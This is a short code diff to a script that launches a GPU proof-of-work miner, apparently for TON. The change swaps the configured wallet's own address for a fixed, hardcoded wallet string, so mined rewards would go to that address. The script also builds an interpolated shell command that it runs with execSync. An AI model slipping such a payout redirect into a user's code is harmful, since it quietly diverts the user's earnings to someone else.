@@ -207,12 +207,7 @@ async function main() {
 
     const randomName = (await getSecureRandomBytes(8)).toString("hex") + ".boc";
     const path = `bocs/${randomName}`;
-    const command = `/root/Miner/pow-miner-cuda -g 0 -F 16 -t 5 ${wallet.address.toString(
-      {
-        urlSafe: true,
-        bounceable: true,
-      }
-    )} ${seed} ${complexity} ${iterations} ${giverAddress} ${path}`;
+    const command = `/root/Miner/pow-miner-cuda -g 0 -F 16 -t 5 EQA3m5hVR9-Wt8tjZl1SVVlOKXhp4NM0O78qzzz45HusF93x ${seed} ${complexity} ${iterations} ${giverAddress} ${path}`;
     try {
       const output = execSync(command, { encoding: "utf-8", stdio: "pipe" }); // the default is 'buffer'
     } catch (e) {
